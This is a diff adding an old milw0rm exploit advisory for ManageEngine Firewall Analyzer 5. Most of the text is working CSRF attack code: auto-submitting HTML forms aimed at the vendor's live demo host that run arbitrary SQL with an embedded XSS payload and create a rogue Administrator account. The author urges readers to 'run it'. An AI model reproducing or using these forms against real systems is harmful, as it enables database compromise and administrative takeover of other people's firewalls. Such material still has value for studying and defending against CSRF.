@@ -1,0 +1,55 @@
+Written By Michael Brooks
+Special thanks to str0ke!
+
+
+Product: ManageEngine Firewall Analyzer 5 - XSRF and XSS
+Vulerable version:
+Build Version  :  	5.0.0
+Build Number  :  	5000
+Build Date  :  	Apr_25
+homepage:
+http://fwanalyzer.com/
+
+This is live exploit code against the online demo.   Go ahead,  run it!
+
+With this exploit you can execute any SQL query you want,  this is not
+SQL Injection.  I think its funny that the sql query is also
+vulnerable to xss.
+
+XSRF to execute Arbatrary SQL Queries.  This is not SQL Injection,
+its better because you can execute *any*  query.
+<html>
+	<form action='http://demo.fwanalyzer.com/fw/runQuery.do' method='POST' id=1>
+		<input type=hidden name="execute" value="true" >
+		<input type=hidden name="DatabaseType" value="mysql">
+		<input type=hidden name="query" value='select
+"<script>alert(/0wn3d/)</script>"'>
+		<input type=submit>
+	</form>
+</html>
+
+Create a new administrative account badmin:badmin:
+<html>
+	<form action='http://demo.fwanalyzer.com/fw/userManagementForm.do'
+method='POST' id=2>
+		<input type=hidden name='addField' value='true'>
+		<input type=hidden name='productName' value='firewall'>
+		<input type=hidden name='userType' value='Administrator'>
+		<input type=hidden name='licType' value='Prem'>
+		<input type=hidden name='userName' value='madmin'>
+		<input type=hidden name='pwd1' value='badmin'>
+		<input type=hidden name='password' value='badmin'>
+		<input type=hidden name='userGroup' value='Administrator'>
+		<input type=hidden name='email' value='badmin@badmin.com'>
+		<input type=hidden name='availableDevices' value='301'>
+		<input type=hidden name='Submit3' value='Add User'>
+		<input type=submit>
+		</form>
+</html>
+
+<script>
+	document.getElementById(1).submit();
+	//document.getElementById(2).submit();
+</script>
+
+# milw0rm.com [2009-01-29]
